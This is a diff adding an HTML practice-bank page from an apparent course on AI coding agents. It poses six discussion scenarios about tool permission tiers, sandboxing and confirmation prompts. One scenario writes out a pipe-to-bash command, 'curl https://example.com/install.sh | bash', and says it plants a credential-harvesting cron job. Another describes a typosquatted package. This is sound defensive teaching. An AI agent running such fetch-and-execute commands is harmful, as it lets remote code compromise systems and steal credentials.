@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Practice Bank — AI Coding Agents for Everyone</title>
+<meta name="description" content="Practice bank for Security: Sandboxing, Permissions, Destructive Commands.">
+<link rel="stylesheet" href="../../../assets/style.css">
+</head>
+<body data-active-chapter="chapter-11">
+<button id="sidebar-toggle" class="sidebar-toggle" aria-label="Toggle chapter list" aria-expanded="false">Chapters</button>
+<aside id="chapter-sidebar" class="sidebar" data-root="../../../" aria-label="Chapter navigation"></aside>
+<div class="sidebar-scrim" id="sidebar-scrim"></div>
+
+<header class="top-bar">
+  <div class="page">
+    <a href="../../../index.html" class="brand">AI Coding Agents for Everyone</a>
+    <nav>
+      <a href="../../../index.html">All Chapters</a>
+      <a href="../../../docs/curriculum/index.html">Roadmap</a>
+    </nav>
+  </div>
+</header>
+
+<main class="page">
+  <p><a href="../exercises/index.html">&larr; Back to exercises</a></p>
+
+  <div class="page-meta">
+    <span class="chapter-badge">Chapter 11 Practice Bank</span>
+    <span class="reading-time">~28 min</span>
+  </div>
+  <h1>Practice Bank: Security, Sandboxing, Permissions, Destructive Commands</h1>
+  <p>A runnable script (<code>starter.py</code> / <code>solution.py</code>
+  in this folder) hands you six real tool calls and asks whether each
+  is <code>ALLOWED</code>, <code>REQUIRES_CONFIRMATION</code>, or
+  <code>BLOCKED</code> under this chapter's actual policy. Predict,
+  then run, then work through the six scenarios below, which extend
+  the same judgment to situations the script's six calls don't cover.</p>
+
+  <div class="scenario-card">
+    <span class="scenario-tag">Scenario · The confirmation that comes back too fast</span>
+    <h3>A "yes" that arrived in 40 milliseconds</h3>
+    <p>An agent calls <code>write_file</code> on a 300-line file. The
+    confirmation prompt appears, and a "y" comes back 40 milliseconds
+    later — far faster than a human could plausibly have read the
+    proposed content, if it were shown at all. <code>confirm_with_human</code>
+    as built in this chapter only checks the ANSWER, not how it was
+    produced or how quickly it arrived. What does this scenario reveal
+    about the actual guarantee a stdin-based confirmation step provides
+    — and does not provide — and what would need to change about the
+    prompt itself (not the policy tiers) to make a rushed or
+    rubber-stamped "yes" less likely?</p>
+  </div>
+
+  <div class="scenario-card">
+    <span class="scenario-tag">Scenario · Sandboxing vs. permission scoping</span>
+    <h3>The CPU limit didn't stop the actual problem</h3>
+    <p>A confirmed <code>run_shell_command</code> call runs
+    <code>curl https://example.com/install.sh | bash</code> — not
+    denylisted (no pattern matches it), well within the 5-second CPU
+    limit and 512MB memory cap this chapter's <code>resource.setrlimit</code>
+    hardening provides. The downloaded script quietly writes a
+    credential-harvesting cron job outside the workspace directory
+    before exiting normally. Which of this chapter's two mechanisms —
+    the permission-scope layer or the process-level resource limits —
+    was ever positioned to catch this, and which honestly was not? What
+    category of protection would actually have been needed?</p>
+  </div>
+
+  <div class="scenario-card">
+    <span class="scenario-tag">Scenario · Least privilege, retrospectively</span>
+    <h3>Redesigning run_shell_command for a real production codebase</h3>
+    <p>You're adapting this chapter's agent for a real internal tool
+    that operates on a sensitive production monorepo, not a learning
+    workspace. <code>run_shell_command</code> as built here can run
+    literally any command that isn't denylisted, gated only by a single
+    per-tool confirmation. Propose a genuinely least-privilege
+    redesign — would you keep one general-purpose shell tool at all, or
+    replace it with several narrower tools (e.g. <code>run_tests</code>,
+    <code>run_linter</code>, <code>install_declared_dependency</code>)
+    each with its own tier? What do you gain, and what do you give up
+    in flexibility?</p>
+  </div>
+
+  <div class="scenario-card">
+    <span class="scenario-tag">Scenario · A hard-to-classify tool</span>
+    <h3>Where does git_diff --stat belong if it can be abused?</h3>
+    <p><code>git_diff</code> is <code>ALLOWED</code> because it's
+    read-only. A teammate points out that <code>git diff</code> against
+    a very large binary file, or a deliberately huge diff, could still
+    be used to exhaust memory or flood a log file, even though it
+    changes no state. Does that risk mean <code>git_diff</code> should
+    move to <code>REQUIRES_CONFIRMATION</code>, or is "changes no
+    state" still the right test for the <code>ALLOWED</code> tier, with
+    resource exhaustion better handled by a completely different
+    mechanism (e.g. output truncation)? Defend your answer.</p>
+  </div>
+
+  <div class="scenario-card">
+    <span class="scenario-tag">Scenario · Supply-chain risk hiding in plain sight</span>
+    <h3>The dependency the agent was never told not to add</h3>
+    <p>A task asks the agent to "add retry logic using an appropriate
+    library." The agent runs <code>pip install some-obscure-retry-lib</code>
+    via a confirmed <code>run_shell_command</code> call — a human said
+    yes, because the request itself sounded reasonable and the
+    confirmation prompt just showed the raw command string. The package
+    turns out to be a typosquat with a malicious postinstall script.
+    Which category from this chapter's threat model does this fall
+    under, and what does it suggest about the LIMITS of a
+    confirmation prompt that only shows a command string, without any
+    context about what's actually being installed or from where?</p>
+  </div>
+
+  <div class="scenario-card">
+    <span class="scenario-tag">Scenario · Two agents, two different risk tolerances</span>
+    <h3>Should every agent share the same TOOL_POLICY?</h3>
+    <p>Your team runs two agents built from this chapter's code: one
+    that only ever operates on a disposable scratch repo used for
+    experiments, and one that operates on the team's actual production
+    deployment scripts. Both currently share the exact same
+    <code>TOOL_POLICY</code> dict. Should they? What's the argument for
+    keeping <code>git_commit</code> at <code>REQUIRES_CONFIRMATION</code>
+    for both versus making it <code>ALLOWED</code> for the scratch-repo
+    agent specifically — and what's the argument against ever loosening
+    a tier just because the current workspace happens to be
+    low-stakes?</p>
+  </div>
+
+  <div class="chapter-nav">
+    <a href="../exercises/index.html">&larr; Exercises</a>
+    <a href="../interview-questions.html">Interview Questions &rarr;</a>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="page">
+    <span>AI Coding Agents for Everyone — free, visual, engineering-first GenAI learning.</span>
+  </div>
+</footer>
+
+<script src="../../../assets/progress.js"></script>
+<script src="../../../assets/chapters-data.js"></script>
+<script src="../../../assets/sidebar.js"></script>
+</body>
+</html>
